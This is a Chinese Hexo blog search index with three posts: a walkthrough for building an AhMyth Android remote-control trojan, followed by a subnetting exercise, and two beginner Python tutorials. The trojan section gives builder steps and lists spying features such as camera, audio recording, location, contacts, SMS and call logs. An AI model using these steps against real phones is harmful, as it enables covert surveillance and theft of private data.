<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>木马的使用及网址</title>
    <link href="/2023/12/04/%E6%9C%A8%E9%A9%AC%E7%9A%84%E4%BD%BF%E7%94%A8%E5%8F%8A%E7%BD%91%E5%9D%80/"/>
    <url>/2023/12/04/%E6%9C%A8%E9%A9%AC%E7%9A%84%E4%BD%BF%E7%94%A8%E5%8F%8A%E7%BD%91%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<h3 id="木马的使用"><a href="#木马的使用" class="headerlink" title="木马的使用"></a>木马的使用</h3><p>cs模式</p><p>c是客户端，s是服务端。</p><p>c对s发送信息是反弹shell</p><p>s对c发送信息是正常shell</p><p>ip为0.0.0.0是本机所有IP地址。0.0.0.0，最特殊的一个ip地址，代表的是本机所有ip地址，不管你有多少个网口，多少个ip，如果监听本机的0.0.0.0上的端口，就等于监听机器上的所有ip端口。换句话说，就是只要数据报目的地址是你机器上的一个ip地址，那么就能被接受。这个ip相当于java中的this，代表当前设备的IP。 </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgshell%E4%BC%A0%E9%80%92.png" alt="shell传递"></p><p>但正常shell发送信息时可能会被防火墙拦截，所以不常使用。</p><h2 id="ahmyth安卓远控"><a href="#ahmyth安卓远控" class="headerlink" title="ahmyth安卓远控"></a>ahmyth安卓远控</h2><p>下载<a href="http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E8%BF%9C%E6%8E%A7/%E5%AE%89%E5%8D%93%E7%97%85%E6%AF%92%E7%9B%91%E5%90%AC/AhMyth_Win64.exe">ahmyth</a>点击进入后：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgahmyth.png" alt="ahmyth"></p><p>点击”APK Builder”：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%94%9F%E6%88%90apk.png" alt="生成apk"></p><p>在”Source IP”输入木马生成的数据传输到的电脑IP地址，”Source Port”需记住，build生成。找到生成的文件地址，在mumu模拟器安装生成的apk文件。双击apk，再到”Victims”中的port里输入”Source Port”的地址，最后监听。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg%25E7%259B%2591%25E5%2590%25ACapk%25E7%259A%2584%25E6%2589%258B%25E6%259C%25BA.png" alt="监听apk的手机"></p><p>最后点击”Open The Lab”<em>（等待一会）</em>，会生成一个远控手机的窗口。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img977477d1bec1431c97752f6549a58007.png" alt="img"></p><p>功能依次是，拍照 ，控制文件，录音，查看手机所在地图，查看通迅录，发短信，查看通话记录。</p><p><strong>注意：若bulid无法生成木马则需要配置jdk环境。</strong></p><p><a href="https://www.oracle.com/cn/java/technologies/downloads/#jdk20-windows">Java Downloads | Oracle 中国</a> jdk安装地址</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img50574e39f81c429bad9e57b8c789a4e4.png" alt="img"></p><p>安装完成后就可以正常生成木马了。</p><hr><h2 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h2><h3 id="1-题目"><a href="#1-题目" class="headerlink" title="1 题目"></a><strong>1 题目</strong></h3><table><thead><tr><th align="left">题目：计算并填写下表</th><th align="left"></th></tr></thead><tbody><tr><td align="left">IP地址</td><td align="left">111.181.21.9</td></tr><tr><td align="left">子网掩码</td><td align="left">255.192.0.0</td></tr><tr><td align="left">地址类别</td><td align="left">【1】</td></tr><tr><td align="left">网络地址</td><td align="left">【2】</td></tr><tr><td align="left">直接广播地址</td><td align="left">【3】</td></tr><tr><td align="left">主机号</td><td align="left">【4】</td></tr><tr><td align="left">子网内的最后一个可用IP地址</td><td align="left">【5】</td></tr></tbody></table><p>对于此类题目，我们只需要搞懂IP地址、子网掩码、网络号、主机号、直接广播地址等专有名词的概念就可以轻松搞定了。所以先来搞定以下概念。</p><h4 id="1-1-IP地址"><a href="#1-1-IP地址" class="headerlink" title="1.1 IP地址"></a><strong>1.1 IP地址</strong></h4><p>IP地址（Internet Protocol Address）是指互联网协议地址，又译为网际协议地址,用来唯一标识互联网中的一个网络或一台主机。</p><p>IP地址就像是我们的家庭住址一样，如果你要写信给一个人，你就要知道他（她）的地址，这样邮递员才能把信送到。计算机发送信息就好比是邮递员，它必须知道唯一的“家庭地址”才能不至于把信送错人家。只不过我们的地址是用文字来表示的，计算机的地址用二进制数字表示。</p><p>IP地址是一个32位的二进制数，通常被分割为4个“8位二进制数”（也就是4个字节）。IP地址通常用“点分十进制”表示成（a.b.c.d）的形式，其中，a,b,c,d都是0~255之间的十进制整数。例：点分十进IP地址（100.4.5.6），实际上是32位二进制数（01100100.00000100.00000101.00000110）。</p><h5 id="1-1-1-IP地址的分类（IPV4）："><a href="#1-1-1-IP地址的分类（IPV4）：" class="headerlink" title="1.1.1 IP地址的分类（IPV4）："></a><strong>1.1.1 IP地址的分类（IPV4）：</strong></h5><p>IP地址共32bit（位），每8位为一组，用点分十进制的方法表示，分为A、B、C、D、E、F五大类和特殊IP地址，其中A、B、C三类较为常用。IP地址由“网络号+主机号”的结构组成，详细分类见下图：</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-7750513/27c7044c0fbb6ce49a996f674f9f4bea.png" alt="img"></p><p>A、B、C三类地址范围划分如下表所示：</p><table><thead><tr><th align="left">地址类型</th><th align="left">地址范围</th><th align="left">可分配的网络数</th></tr></thead><tbody><tr><td align="left">A 类</td><td align="left">1.0.0.0~127.255.255.255</td><td align="left">&#x3D;128</td></tr><tr><td align="left">B 类</td><td align="left">128.0.0.0~191.255.255.255</td><td align="left">&#x3D;16384</td></tr><tr><td align="left">C 类</td><td align="left">192.0.0.0~223.255.255.255</td><td align="left">&#x3D;2097152</td></tr></tbody></table><p>特殊的IP地址包括：受限广播（limited broadcasting）地址、直接广播（directed broadcasting）地址、“这个网络上的特定主机”地址与回送地址（loopback address）。</p><p>（1）受限广播地址</p><p>受限广播地址也叫做有限广播地址，它的32bit全部用1表示，即为：255.255.255.255。此地址用来将一个分组以广播的形式发送给特定网络中的所有主机。</p><p>（2）直接广播地址</p><p>直接广播地址的形式是一个有效的网络号和一个全1的主机号，用来使路由器将一个来自其他网络的分组以关闭的方式发送给特定网络上的所有主机。例如，主机199.25.123.24要以广播的方式发送一个分组给221.25.123.0的特定网络中的所有主机，则需要使用的直接广播地址为221.25.123.255。</p><p><strong>直接广播地址 &#x3D; 主机号全1的IP地址</strong></p><p>（3）“这个网络上的特定主机”地址</p><p>“这个网络上的特定主机”地址的形式为一个全0的网络号和一个确定的主机号，用于同一网络内部某个主机或某个路由器向另一个主机发送分组。例如：主机199.158.26.25要向本网络内的IP地址为199.158.26.155的主机发送发送一个分组，其目的地址应为0.0.0.155。</p><p>（4）回送地址</p><p>回送地址用于网络软件测试和本地进程间的通信。例如A类IP地址127.0.0.0是一个保留地址，即回送地址。</p><h4 id="1-2-子网掩码"><a href="#1-2-子网掩码" class="headerlink" title="1.2 子网掩码"></a><strong>1.2 子网掩码</strong></h4><p>子网掩码(subnet mask)又叫网络掩码、地址掩码、子网络遮罩，它是一种用来指明一个IP地址的哪些位标识的是主机所在的子网，以及哪些位标识的是主机的位掩码。子网掩码不能单独存在，它必须结合IP地址一起使用。子网掩码只有一个作用，就是将某个IP地址划分成网络地址和主机地址两部分。</p><p>​    子网掩码是在IPv4地址资源紧缺的背景下为了解决lP地址分配而产生的虚拟lP技术，通过子网掩码将A、B、C三类地址划分为若干子网，从而显著提高了IP地址的分配效率，有效解决了IP地址资源紧张的局面。另一方面，在企业内网中为了更好地管理网络，网管人员也利用子网掩码的作用，人为地将一个较大的企业内部网络划分为更多个小规模的子网，再利用三层交换机的路由功能实现子网互联，从而有效解决了网络广播风暴和网络病毒等诸多网络管理方面的问题。</p><h4 id="1-3-网络地址"><a href="#1-3-网络地址" class="headerlink" title="1.3 网络地址"></a><strong>1.3 网络地址</strong></h4><p>网络地址：IP地址和子网掩码进行与运算，将运算结果中的网络地址不变，主机地址变为0，即主机号全0的IP地址是网络地址。例如IP地址为111.181.21.9，子网掩码为255.192.0.0，它的网络地址则为：111.128.0.0。</p><p>在计算机领域中，网络就是用物理链路将各个孤立的工作站或主机相连在一起，组成数据链路，从而达到资源共享和通信的目的。网络地址（Network address）则是互联网上的节点在网络中具有的逻辑地址，可对节点进行寻址。IP地址是在互联网上给主机编址的方式，为每个计算机分配一个逻辑地址，这样不但能够对计算机进行识别，还能进行信息共享。</p><p><strong>网络地址 &#x3D; IP地址和子网掩码进行与运算</strong></p><p><strong>网络地址 &#x3D; 主机号全0的IP地址</strong></p><h5 id="1-3-1-子网内的第一个可用IP地址："><a href="#1-3-1-子网内的第一个可用IP地址：" class="headerlink" title="1.3.1 子网内的第一个可用IP地址："></a><strong>1.3.1 子网内的第一个可用IP地址：</strong></h5><p>子网内的第一个可用IP地址就是网络地址的后一位。</p><p>子网内的第一个可用IP地址 &#x3D; 网络地址+1</p><h5 id="1-3-2-子网内的最后一个可用IP地址："><a href="#1-3-2-子网内的最后一个可用IP地址：" class="headerlink" title="1.3.2 子网内的最后一个可用IP地址："></a><strong>1.3.2 子网内的最后一个可用IP地址：</strong></h5><p>子网内的最后一个可用IP地址就是直接广播地址的前一位。</p><p>子网内的最后一个可用IP地址&#x3D;直接广播地址-1</p><h3 id="2-思路"><a href="#2-思路" class="headerlink" title="2 思路"></a><strong>2 思路</strong></h3><p>看到这里，上面的题目就显得格外简单了，接下来附上解题思路与参考答案。</p><ol><li>根据A、B、C三类地址范围划分表可知，IP地址111.181.21.9属于A类地址。因此在【1】处应填入：A类。</li><li>网络地址&#x3D;IP地址和子网掩码进行与运算，二进制表示如下图：</li></ol><p><img src="https://ask.qcloudimg.com/http-save/yehe-7750513/6f88adefdb733aa02190564af78709eb.png" alt="img"></p><p>转为十进制后：111.128.0.0，因此【2】处填入：111.128.0.0。</p><ol><li>直接广播地址&#x3D;主机号全1的IP地址。子网掩码转为二进制为11111111 11000000 00000000 00000000，可知后22位为主机号。得到直接广播地址为01101111 10111111 11111111 11111111，转为十进制得111.191.255.255。因此【3】处应填入111.191.255.255。</li><li>主机号&#x3D;网络号全0的IP地址。由【3】可知，前10位为网络号，网络号置为0得到00000000 00110101 00010101 00001001，转为十进制0.53.21.9。因此【4】处应填入：0.53.21.9。</li><li>子网内最后一个可用IP地址&#x3D;直接广播地址-1。由【3】知，直接广播地址为111.191.255.255，因此【5】处应填入111.191.255.254。</li></ol><h3 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a><strong>3 总结</strong></h3><ol><li>直接广播地址&#x3D;主机号全1的IP地址</li><li>网络地址&#x3D;IP地址和子网掩码进行与运算&#x3D;主机号全0的IP地址</li><li>主机号&#x3D;网络号全0的IP地址</li><li>子网内的第一个可用IP地址&#x3D;网络地址+1</li><li>子网内的最后一个可用IP地址&#x3D;直接广播地址-1</li><li>主机数&#x3D; (n：主机号的个数)</li><li>可用主机数&#x3D;-2（要去掉广播地址和网络地址，n：主机号的个数）</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python基础-4(条件控制语句和循环语句)</title>
    <link href="/2023/12/03/python%E5%9F%BA%E7%A1%80-4-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5/"/>
    <url>/2023/12/03/python%E5%9F%BA%E7%A1%80-4-%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="Python3条件控制语句"><a href="#Python3条件控制语句" class="headerlink" title="Python3条件控制语句"></a>Python3条件控制语句</h2><p>Python 条件语句是通过一条或多条语句的执行结果（True 或者 False）来决定执行的代码块。</p><p>可以通过下图来简单了解条件语句的执行过程:</p><p> <img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgif-condition.jpg" alt="img"> </p><p>代码执行过程：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgpython-if.webp" alt="img"></p><h3 id="if-语句"><a href="#if-语句" class="headerlink" title="if 语句"></a>if 语句</h3><p>Python中if语句的一般形式如下所示：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">if</span> condition_1:                <span class="hljs-meta">#<span class="hljs-keyword">if</span> 判断条件:</span><br>    statement_block_1          <span class="hljs-meta">#(tab键)执行语句</span><br>elif condition_2:              <span class="hljs-meta">#<span class="hljs-keyword">elif</span> 判断条件：</span><br>    statement_block_2          <span class="hljs-meta">#执行语句</span><br><span class="hljs-keyword">else</span>:                          <span class="hljs-meta">#<span class="hljs-keyword">else</span>：</span><br>    statement_block_3          <span class="hljs-meta">#    执行语句</span><br></code></pre></td></tr></table></figure><ul><li>如果 “condition_1” 为 True 将执行 “statement_block_1” 块语句</li><li>如果 “condition_1” 为False，将判断 “condition_2”</li><li>如果”condition_2” 为 True 将执行 “statement_block_2” 块语句</li><li>如果 “condition_2” 为False，将执行”statement_block_3”块语句</li></ul><p>Python 中用 <strong>elif</strong> 代替了 <strong>else if</strong>，所以if语句的关键字为：<strong>if – elif – else</strong>。</p><p><strong>注意：</strong></p><ul><li>1、每个条件后面要使用冒号 :，表示接下来是满足条件后要执行的语句块。</li><li>2、使用缩进来划分语句块，相同缩进数的语句在一起组成一个语句块。</li><li>3、在 Python 中没有 switch…case 语句，但在 Python3.10 版本添加了 match…case，功能也类似。</li></ul><p>Gif 演示：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img006faQNTgw1f5wnm0mcxrg30ci07o47l.gif" alt="img"></p><p>以下是一个简单的 if 实例：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgif%E8%AF%AD%E5%8F%A5.png" alt="if语句"></p><p>以下为if中常用的操作运算符:</p><table><thead><tr><th>操作符</th><th>描述</th></tr></thead><tbody><tr><td><code>&lt;</code></td><td>小于</td></tr><tr><td><code>&lt;=</code></td><td>小于或等于</td></tr><tr><td><code>&gt;</code></td><td>大于</td></tr><tr><td><code>&gt;=</code></td><td>大于或等于</td></tr><tr><td><code>==</code></td><td>等于，比较两个值是否相等</td></tr><tr><td><code>!=</code></td><td>不等于</td></tr></tbody></table><p>实例</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6.png" alt="比较运算符"></p><h3 id="if嵌套"><a href="#if嵌套" class="headerlink" title="if嵌套"></a>if嵌套</h3><p>在嵌套 if 语句中，可以把 if…elif…else 结构放在另外一个 if…elif…else 结构中。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgif%E5%B5%8C%E5%A5%97.png" alt="if嵌套"></p><h3 id="match…case"><a href="#match…case" class="headerlink" title="match…case"></a>match…case</h3><p>Python 3.10 增加了 match…case 的条件判断，不需要再使用一连串的 if-else 来判断了。</p><p>match 后的对象会依次与 case 后的内容进行匹配，如果匹配成功，则执行匹配到的表达式，否则直接跳过，_ 可以匹配一切。</p><p>语法格式如下：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-built_in">match</span> subject:<br>    case <span class="hljs-variable">&lt;pattern_1&gt;</span>:<br>        <span class="hljs-variable">&lt;action_1&gt;</span><br>    case <span class="hljs-variable">&lt;pattern_2&gt;</span>:<br>        <span class="hljs-variable">&lt;action_2&gt;</span><br>    case <span class="hljs-variable">&lt;pattern_3&gt;</span>:<br>        <span class="hljs-variable">&lt;action_3&gt;</span><br>    case _:<br>        <span class="hljs-variable">&lt;action_wildcard&gt;</span><br></code></pre></td></tr></table></figure><p>case _: 类似于 C 和 Java 中的 default:，当其他 case 都无法匹配时，匹配这条，保证永远会匹配成功。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgmatch...case%E7%9A%84%E5%BA%94%E7%94%A8.png" alt="match...case的应用"></p><p>一个 case 也可以设置多个匹配条件，条件使用 ｜ 隔开，例如：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">...<br>    <span class="hljs-built_in">case</span> <span class="hljs-number">401</span>|<span class="hljs-type">403</span>|<span class="hljs-type">404</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Not allowed&quot;</span><br></code></pre></td></tr></table></figure><hr><h2 id="Python3-循环语句"><a href="#Python3-循环语句" class="headerlink" title="Python3 循环语句"></a>Python3 循环语句</h2><p>Python 循环语句的控制结构图如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgloop.png" alt="img"></p><h3 id="while-循环"><a href="#while-循环" class="headerlink" title="while 循环"></a>while 循环</h3><p>Python 中 while 语句的一般形式：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">while</span> 判断条件<span class="hljs-comment">(condition)</span>：<br>    执行语句<span class="hljs-comment">(statements)</span>……<br></code></pre></td></tr></table></figure><p>执行流程图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img886A6E10-58F1-4A9B-8640-02DBEFF0EF9A.jpg" alt="img"></p><p>执行 Gif 演示：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img006faQNTgw1f5wnm06h3ug30ci08cake.gif" alt="img"></p><p>同样需要注意冒号和缩进。另外，在 Python 中没有 do..while 循环。</p><p>以下实例使用了 while 来计算 1 到 100 的总和：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgwhile%E5%BE%AA%E7%8E%AF.png" alt="while循环"></p><h3 id="无限循环"><a href="#无限循环" class="headerlink" title="无限循环"></a>无限循环</h3><p>我们可以通过设置条件表达式永远不为 false 来实现无限循环，实例如下：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%97%A0%E9%99%90%E5%BE%AA%E7%8E%AF.png" alt="无限循环"></p><p>你可以使用  <strong>CTRL+C</strong> 来退出当前的无限循环。</p><p>无限循环在服务器上客户端的实时请求非常有用。</p><h3 id="while-循环使用-else-语句"><a href="#while-循环使用-else-语句" class="headerlink" title="while 循环使用 else 语句"></a>while 循环使用 else 语句</h3><p>如果 while 后面的条件语句为 false 时，则执行 else 的语句块。</p><p>语法格式如下：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">while</span></span> &lt;<span class="hljs-variable">expr</span>&gt;:<br>    &lt;<span class="hljs-function"><span class="hljs-title">statement</span>(<span class="hljs-variable">s</span>)&gt;</span><br><span class="hljs-function"><span class="hljs-variable"><span class="hljs-keyword">else</span></span>:</span><br><span class="hljs-function">    &lt;<span class="hljs-title">additional_statement</span>(<span class="hljs-variable">s</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>expr 条件语句为 true 则执行 statement(s) 语句块，如果为 false，则执行 additional_statement(s)。</p><p>循环输出数字，并判断大小：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%BE%AA%E7%8E%AF%E8%BE%93%E5%87%BA%E6%95%B0%E5%AD%97%E5%88%A4%E6%96%AD%E5%A4%A7%E5%B0%8F.png" alt="循环输出数字判断大小"></p><h3 id="简单语句组"><a href="#简单语句组" class="headerlink" title="简单语句组"></a>简单语句组</h3><p>类似 if 语句的语法，如果你的 while 循环体中只有一条语句，你可以将该语句与 while 写在同一行中， 如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%B2%A1%E6%9C%89%E7%BB%93%E6%9D%9F%E6%9D%A1%E4%BB%B6%E6%97%A0%E9%99%90%E5%BE%AA%E7%8E%AF.png" alt="没有结束条件无限循环"></p><p><strong>注意：以上的无限循环你可以使用 CTRL+C 来中断循环。</strong></p><h3 id="for循环语句"><a href="#for循环语句" class="headerlink" title="for循环语句"></a>for循环语句</h3><p>Python for 循环可以遍历任何可迭代对象，如一个列表或者一个字符串。</p><p>for循环的一般格式如下：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">for</span> <span class="hljs-symbol">&lt;variable&gt;</span> in <span class="hljs-symbol">&lt;sequence&gt;</span>:<br>    <span class="hljs-symbol">&lt;statements&gt;</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-symbol">&lt;statements&gt;</span><br></code></pre></td></tr></table></figure><p><strong>流程图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgA71EC47E-BC53-4923-8F88-B027937EE2FF.jpg" alt="img"></p><p>Python for 循环实例：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgfor%E5%BE%AA%E7%8E%AF.png" alt="for循环"></p><p>也可用于打印字符串中的每个字符：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgfor%E5%BE%AA%E7%8E%AF%E6%89%93%E5%8D%B0%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E6%AF%8F%E4%B8%AA%E5%AD%97%E6%AF%8D.png" alt="for循环打印字符串的每个字母"></p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python基础-3(python运算符和输入输出)</title>
    <link href="/2023/12/03/python%E5%9F%BA%E7%A1%80-3-python%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
    <url>/2023/12/03/python%E5%9F%BA%E7%A1%80-3-python%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
    
    <content type="html"><![CDATA[<h2 id="python运算符"><a href="#python运算符" class="headerlink" title="python运算符"></a>python运算符</h2><h3 id="python算术运算符"><a href="#python算术运算符" class="headerlink" title="python算术运算符"></a>python算术运算符</h3><p>以下假设变量 a&#x3D;10，变量 b&#x3D;21：</p><table><thead><tr><th align="center">运算符</th><th align="left">描述</th><th>实例</th></tr></thead><tbody><tr><td align="center">+</td><td align="left">加 - 两个对象相加</td><td>a + b 输出结果 31</td></tr><tr><td align="center">-</td><td align="left">减 - 得到负数或是一个数减去另一个数</td><td>a - b 输出结果 -11</td></tr><tr><td align="center">*</td><td align="left">乘 - 两个数相乘或是返回一个被重复若干次的字符串</td><td>a * b 输出结果 210</td></tr><tr><td align="center">&#x2F;</td><td align="left">除 - x 除以 y</td><td>b &#x2F; a 输出结果 2.1</td></tr><tr><td align="center">%</td><td align="left">取模 - 返回除法的余数</td><td>b % a 输出结果 1</td></tr><tr><td align="center">**</td><td align="left">幂 - 返回x的y次幂</td><td>a**b 为10的21次方</td></tr><tr><td align="center">&#x2F;&#x2F;</td><td align="left">取整除 - 往小的方向取整数</td><td><code>&gt;&gt;&gt; 9//2 4 &gt;&gt;&gt; -9//2 -5</code></td></tr></tbody></table><p><strong>注意：若是将两个字符串进行‘+’运算则是将两个字符串连接。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%2B%E8%BF%90%E7%AE%97.png" alt="字符串的+运算"></p><p>且若使用字符串连接必须要保证+号两边都是字符串，否则会报错。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B4%E5%9E%8B%E8%BF%9E%E6%8E%A5.png" alt="字符串与整型连接"></p><h3 id="Python赋值运算符"><a href="#Python赋值运算符" class="headerlink" title="Python赋值运算符"></a>Python赋值运算符</h3><p>以下假设变量a为10，变量b为20：</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>&#x3D;</td><td>简单的赋值运算符</td><td>c &#x3D; a + b 将 a + b 的运算结果赋值为 c</td></tr><tr><td>+&#x3D;</td><td>加法赋值运算符</td><td>c +&#x3D; a 等效于 c &#x3D; c + a</td></tr><tr><td>-&#x3D;</td><td>减法赋值运算符</td><td>c -&#x3D; a 等效于 c &#x3D; c - a</td></tr><tr><td>*&#x3D;</td><td>乘法赋值运算符</td><td>c *&#x3D; a 等效于 c &#x3D; c * a</td></tr><tr><td>&#x2F;&#x3D;</td><td>除法赋值运算符</td><td>c &#x2F;&#x3D; a 等效于 c &#x3D; c &#x2F; a</td></tr><tr><td>%&#x3D;</td><td>取模赋值运算符</td><td>c %&#x3D; a 等效于 c &#x3D; c % a</td></tr><tr><td>**&#x3D;</td><td>幂赋值运算符</td><td>c **&#x3D; a 等效于 c &#x3D; c ** a</td></tr><tr><td>&#x2F;&#x2F;&#x3D;</td><td>取整除赋值运算符</td><td>c &#x2F;&#x2F;&#x3D; a 等效于 c &#x3D; c &#x2F;&#x2F; a</td></tr><tr><td>:&#x3D;</td><td>海象运算符，可在表达式内部为变量赋值。<strong>Python3.8 版本新增运算符</strong>。</td><td>在这个示例中，赋值表达式可以避免调用 len() 两次: <code>if (n := len(a)) &gt; 10:    print(f&quot;List is too long (&#123;n&#125; elements, expected &lt;= 10)&quot;)</code></td></tr></tbody></table><p><strong>注意：‘&#x3D;’可以为多个变量赋值，且可以赋不同类型的值：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%A4%9A%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BCpng.png" alt="多变量赋值png"></p><h3 id="Python-比较运算符"><a href="#Python-比较运算符" class="headerlink" title="Python 比较运算符"></a>Python 比较运算符</h3><p>以下假设变量 a 为 10，变量 b 为20：</p><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>&#x3D;&#x3D;</td><td>等于 - 比较对象是否相等</td><td>(a &#x3D;&#x3D; b) 返回 False。</td></tr><tr><td>!&#x3D;</td><td>不等于 - 比较两个对象是否不相等</td><td>(a !&#x3D; b) 返回 True。</td></tr><tr><td>&gt;</td><td>大于 - 返回x是否大于y</td><td>(a &gt; b) 返回 False。</td></tr><tr><td>&lt;</td><td>小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。这分别与特殊的变量True和False等价。注意，这些变量名的大写。</td><td>(a &lt; b) 返回 True。</td></tr><tr><td>&gt;&#x3D;</td><td>大于等于 - 返回x是否大于等于y。</td><td>(a &gt;&#x3D; b) 返回 False。</td></tr><tr><td>&lt;&#x3D;</td><td>小于等于 - 返回x是否小于等于y。</td><td>(a &lt;&#x3D; b) 返回 True。</td></tr></tbody></table><h3 id="Python逻辑运算符"><a href="#Python逻辑运算符" class="headerlink" title="Python逻辑运算符"></a>Python逻辑运算符</h3><p>Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:</p><table><thead><tr><th>运算符</th><th>逻辑表达式</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>and</td><td>x and y</td><td>布尔”与” - 如果 x 为 False，x and y 返回 x 的值，否则返回 y 的计算值。</td><td>(a and b) 返回 20。</td></tr><tr><td>or</td><td>x or y</td><td>布尔”或” - 如果 x 是 True，它返回 x 的值，否则它返回 y 的计算值。</td><td>(a or b) 返回 10。</td></tr><tr><td>not</td><td>not x</td><td>布尔”非” - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。</td><td>not(a and b) 返回 False</td></tr></tbody></table><p><strong>注意：</strong></p><p>1.若and前面的语句已经判断为False则后面的语句不执行（短路与）：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%9F%AD%E8%B7%AF%E4%B8%8E.png" alt="短路与"></p><p>2.若or前面的语句已经判断为True则后面的语句不执行（短路或）：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%9F%AD%E8%B7%AF%E6%88%96.png" alt="短路或"></p><hr><h2 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h2><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p><code>print()</code>可以直接输出“”中的句子，也可以使用+拼接语句，如：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%2B%E6%8B%BC%E6%8E%A5.png" alt="+拼接"></p><p>但是有时候需要多段拼接使用+会十分繁琐：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">name</span> = <span class="hljs-string">&#x27;l&#x27;</span><br><span class="hljs-variable">age</span> = <span class="hljs-number">12</span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&quot;姓名：&quot;</span> + <span class="hljs-variable">name</span> + <span class="hljs-string">&quot;年龄：&quot;</span> + <span 